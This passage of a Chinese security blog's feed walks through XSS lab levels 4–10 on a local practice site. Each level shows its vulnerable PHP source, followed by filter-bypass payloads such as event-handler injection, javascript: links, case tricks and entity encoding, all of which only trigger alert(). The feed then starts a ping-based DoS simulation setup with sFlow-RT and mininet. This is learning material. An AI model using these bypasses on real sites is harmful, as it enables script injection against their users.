title="第四关——htmlspecialchars($str)部分转化(双引号拼接、过滤&lt;和&gt;)"></a>第四关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、过滤<code>&lt;</code>和<code>&gt;</code>)</h2><p>抱着侥幸的心理，去试试第三关的答案能不能过第四关</p><p><img src="/2019/08/15/xss练习（一）/1563432391276.png" alt="1563432391276"></p><p>顺便看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了<code>&lt;</code>、<code>&gt;</code>，但是我们注意到<code>input</code>标签没过滤，估摸着<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>用不了了，我们试试改改上关用的，需要注意的也只有是双引号闭合即可，故构造<code>&quot;onmouseover=&quot;alert(/xss/)</code></p><p><img src="/2019/08/15/xss练习（一）/1563433304093.png" alt="1563433304093"></p><p>第四关<code>pyload</code>:<code>http://127.0.0.1/xss/level4.php?keyword=&quot;onmouseover=&quot;alert(/xss/)</code></p><h2 id="第五关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n"><a href="#第五关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n" class="headerlink" title="第五关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n)"></a>第五关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、<code>strtolower()</code>、将<code>on</code>转化<code>0_n</code>)</h2><p><img src="/2019/08/15/xss练习（一）/1563433656626.png" alt="1563433656626"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>嗯~过滤掉了<code>on</code>和&lt;script，大小写绕过？但是<code>strtolower()</code>会将传入的参数先全部转换为小写，在进行匹配。咋办？</p><p>那我自己重新建个标签呗。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)</span><br></pre></td></tr></table></figure><p>第五关<code>pyload</code>:<code>http://127.0.0.1/xss/level5.php?keyword=&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)</code></p><h2 id="第六关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef"><a href="#第六关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef" class="headerlink" title="第六关——htmlspecialchars($str)部分转化(双引号拼接、无strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef)"></a>第六关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、无<code>strtolower()</code>、将<code>on</code>转化<code>0_n</code>、<code>src</code>转化<code>sr_c</code>、<code>data</code>转化<code>da_ta</code>、<code>href</code>转化<code>hr_ef</code>)</h2><p><img src="/2019/08/15/xss练习（一）/1563434726338.png" alt="1563434726338"></p><p>查看对应源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>怎么办，又自闭了。我们回顾一下几种利用方式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(/xss/)"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keword</span> <span class="attr">value</span>=<span class="string">'hello'</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>//鼠标移动到输入框触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keword</span> <span class="attr">value</span>=<span class="string">'hello'</span> <span class="attr">onfocus</span>=<span class="string">"alert(/xss/)"</span>&gt;</span> //鼠标点击输入框触发</span><br></pre></td></tr></table></figure><p>但是仔细看看，你会发现，没有上一关的<code>strtolower()</code>，哈哈，那改下大小写不就行了</p><p><img src="/2019/08/15/xss练习（一）/1563435580009.png" alt="1563435580009"></p><p>第六关<code>pyload</code>:<code>http://127.0.0.1/xss/level6.php?keyword=&quot;&gt;&lt;ScRIpt&gt;alert(/xss/)&lt;/sCrIPt&gt;&lt;&quot;</code></p><h2 id="第七关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将script、on、src、data、href转化"><a href="#第七关——htmlspecialchars-str-部分转化-双引号拼接、无strtolower-、将script、on、src、data、href转化" class="headerlink" title="第七关——htmlspecialchars($str)部分转化(双引号拼接、无strtolower()、将script、on、src、data、href转化)"></a>第七关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、无<code>strtolower()</code>、将<code>script</code>、<code>on</code>、<code>src</code>、<code>data</code>、<code>href</code>转化<code></code>)</h2><p><img src="/2019/08/15/xss练习（一）/1563435873082.png" alt="1563435873082"></p><p>查看下源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>scScRIptript</code>—-&gt;<code>script</code>，懂我意思了吧</p><p>第六关<code>pyload</code>:<code>http://127.0.0.1/xss/level6.php?keyword=&quot;&gt;&lt;scScRIptript&gt;alert(/xss/)&lt;/scrsCrIPtipt&gt;&lt;&quot;</code></p><p><img src="/2019/08/15/xss练习（一）/1563436791819.png" alt="1563436791819"></p><h2 id="第八关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt-、双引号也被转化"><a href="#第八关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt-、双引号也被转化" class="headerlink" title="第八关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef、script转化src_ipt`、双引号也被转化)"></a>第八关——<code></code>htmlspecialchars($str)<code>部分转化(双引号拼接、</code>strtolower()<code>、将</code>on<code>转化</code>0_n<code>、</code>src<code>转化</code>sr_c<code>、</code>data<code>转化</code>da_ta<code>、</code>href<code>转化</code>hr_ef<code>、</code>script<code>转化</code>src_ipt`、双引号也被转化)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>怎么办呢？只能编码绕过了，再利用<code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code>构造一个</p><p><a href="javascript:alert(/xss/)" target="_blank" rel="noopener"></a></p><p>需要注意的是，再进行过程中，不要在浏览器url框中输入，应当在文本框中输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="/2019/08/15/xss练习（一）/1563438053795.png" alt="1563438053795"></p><p>否则会出现如下情况</p><p><img src="/2019/08/15/xss练习（一）/1563438113970.png" alt="1563438113970"></p><h2 id="第九关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt、双引号也被转化，过滤后strpos-指定字符串限制"><a href="#第九关——htmlspecialchars-str-部分转化-双引号拼接、strtolower-、将on转化0-n、src转化sr-c、data转化da-ta、href转化hr-ef、script转化src-ipt、双引号也被转化，过滤后strpos-指定字符串限制" class="headerlink" title="第九关——htmlspecialchars($str)部分转化(双引号拼接、strtolower()、将on转化0_n、src转化sr_c、data转化da_ta、href转化hr_ef、script转化src_ipt、双引号也被转化，过滤后strpos()指定字符串限制)"></a>第九关——<code>htmlspecialchars($str)</code>部分转化(双引号拼接、<code>strtolower()</code>、将<code>on</code>转化<code>0_n</code>、<code>src</code>转化<code>sr_c</code>、<code>data</code>转化<code>da_ta</code>、<code>href</code>转化<code>hr_ef</code>、<code>script</code>转化<code>src_ipt</code>、双引号也被转化，过滤后<code>strpos()</code>指定字符串限制)</h2><p>先试试呗</p><p><img src="/2019/08/15/xss练习（一）/1563438796204.png" alt="1563438796204"></p><p>看下源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;br&gt;&quot;.$str7.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>其中我们先看懂下<code>strpos()</code>这个函数的意思</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int</span><br><span class="line">返回 needle 在 haystack 中首次出现的数字位置。</span><br><span class="line">如果没找到 needle，将返回 FALSE。</span><br></pre></td></tr></table></figure><p>那只要<code>$str7</code>存在<code>http://</code>这个就行啦？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)&lt;!--http://--&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/08/15/xss练习（一）/1563440063733.png" alt="1563440063733"></p><h2 id="第十关——htmlspecialchars-str-部分转化-双引号、单引号被转化，隐形标签利用"><a href="#第十关——htmlspecialchars-str-部分转化-双引号、单引号被转化，隐形标签利用" class="headerlink" title="第十关——htmlspecialchars($str)部分转化(双引号、单引号被转化，隐形标签利用)"></a>第十关——<code>htmlspecialchars($str)</code>部分转化(双引号、单引号被转化，隐形标签利用)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过源码直接分析<code>keyword</code>的值没办法利用了，因为<code>&lt;</code>和<code>&gt;</code>被<code>htmlspecialchars</code>转化为<code>html</code>实体了，无法构造标签闭合。</p><p>但是还有一个t_sort的值，不过在网页中是隐形的。想想如何构造，只是过滤了<code>&lt;</code>和<code>&gt;</code>，想了想构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ghjkl&quot; onmouseover=&quot;alert(/xss/)&quot; type=&quot;text</span><br></pre></td></tr></table></figure><p><img src="/2019/08/15/xss练习（一）/1563441204204.png" alt="1563441204204"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;跨站脚本攻击（Cross Site Script），为避免与（Cascading Style Sheet，CSS）重名，安全领域我们称为”XSS”。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="XSS" scheme="https://jianghuxia.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）</title>
    <link href="https://jianghuxia.github.io/2019/07/15/%E4%BD%BF%E7%94%A8sFlow-RT%E5%92%8Cmininet%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%88%E9%80%9A%E8%BF%87ping%E6%A8%A1%E6%8B%9Fdos%E6%94%BB%E5%87%BB%EF%BC%89/"/>
    <id>https://jianghuxia.github.io/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/</id>
    <published>2019-07-15T09:20:20.000Z</published>
    <updated>2019-09-02T09:38:30.338Z</updated>
    
    <content type="html"><![CDATA[<p>闲来无趣，有学弟问我，能不能模拟dos攻击，我#￥%……&amp;*（,然后想了想，搜了搜，还真可以模拟，通过ping模拟dos攻击。<br><a id="more"></a> </p><h2 id="更新源"><a href="#更新源" class="headerlink" title="更新源"></a>更新源</h2><p>先放张效果图</p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566972953531.png" alt="1566972953531"></p><p>实验环境为<code>ubuntu18.04</code>，首先还是得配置<code>aliyun</code>的源，然后更新源，安装软件啥的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>然后删掉所有，把下面这段搞进去</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>然后更新下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><h2 id="配置网卡信息"><a href="#配置网卡信息" class="headerlink" title="配置网卡信息"></a>配置网卡信息</h2><p>需要先配置虚拟网络,先查看下桥<code>s1</code>中两个网卡的信息</p><p><code>vm</code>界面直接修改<code>IP</code></p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566869077506.png" alt="1566869077506"></p><p>修改下<code>dhcp</code>的<code>ip</code>起始段</p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566869111153.png" alt="1566869111153"></p><p>然后回到<code>ubuntu18.0</code>4虚拟机中操作</p><h2 id="配置JDK环境"><a href="#配置JDK环境" class="headerlink" title="配置JDK环境"></a>配置JDK环境</h2><p>需要下载<code>jdk</code>（推荐用迅雷下载<code>jdk</code>的包）</p><p>这里使用的是<code>jdk-8u131-linux-x64.tar.gz</code>，放附件了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/profile </span><br><span class="line"></span><br><span class="line">#装路径我放在/usr/local/jdk/jdk1.8.0_131</span><br><span class="line">#接下来在/etc/profile的尾部添加下面的东东哈</span><br><span class="line"></span><br><span class="line">JAVA_HOME=/usr/local/jdk1.8.0_131</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">LASSPATH=:.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">export JAVA_HOME</span><br><span class="line">export PATH</span><br><span class="line">export CLASSPATH</span><br><span class="line"></span><br><span class="line">编译环境文件</span><br><span class="line">sudo source /etc/profile</span><br><span class="line"></span><br><span class="line">#接下来设置全局变量</span><br><span class="line">sudo gedit ~/.bashrc</span><br><span class="line"></span><br><span class="line">#接下来在~/.bashrc的尾部添加下面的东东哈</span><br><span class="line">JAVA_HOME=/usr/local/jdk1.8.0_131</span><br><span class="line">PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line">LASSPATH=:.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line">export JAVA_HOME</span><br><span class="line">export PATH</span><br><span class="line">export CLASSPATH</span><br><span class="line"></span><br><span class="line">编译环境文件</span><br><span class="line">sudo source ~/.bashrc</span><br></pre></td></tr></table></figure><h2 id="开启三个root权限终端"><a href="#开启三个root权限终端" class="headerlink" title="开启三个root权限终端"></a>开启三个root权限终端</h2><h3 id="第一个终端"><a href="#第一个终端" class="headerlink" title="第一个终端"></a>第一个终端</h3><p>然后再下载<code>sflow-rt</code></p><p>下载链接（别用官方的，官方<code>3.0</code>版本的没有<code>Agent</code>界面，下面这个使用的是2.0的版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://codeload.github.com/al13mi/sflow-rt/zip/master</span><br></pre></td></tr></table></figure><p>分别依次进行如下操作（注意，三个终端都要先切换到<code>root</code>权限）（密码<code>Asd123456</code>）</p><p>打开第一个终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/ghjkl/sflow-rt</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure><p>然后打开浏览器，访问<code>http://127.0.0.1:8008/</code>（<code>2.0</code>版本的<code>sFlow-RT</code>有<code>Agent</code>界面可以看到流量动态图）</p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566984058185.png" alt="1566984058185"></p><p>如果是3.0的长这样，毛线都看不到</p><p><img src="/2019/07/15/使用sFlow-RT和mininet抓取数据包（通过ping模拟dos攻击）/1566989175441.png" alt="1566989175441"></p><h3 id="第二个终端"><a href="#第二个终端" class="headerlink" title="第二个终端"></a>第二个终端</h3><p>打开第二个终端</p><p>先下载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install 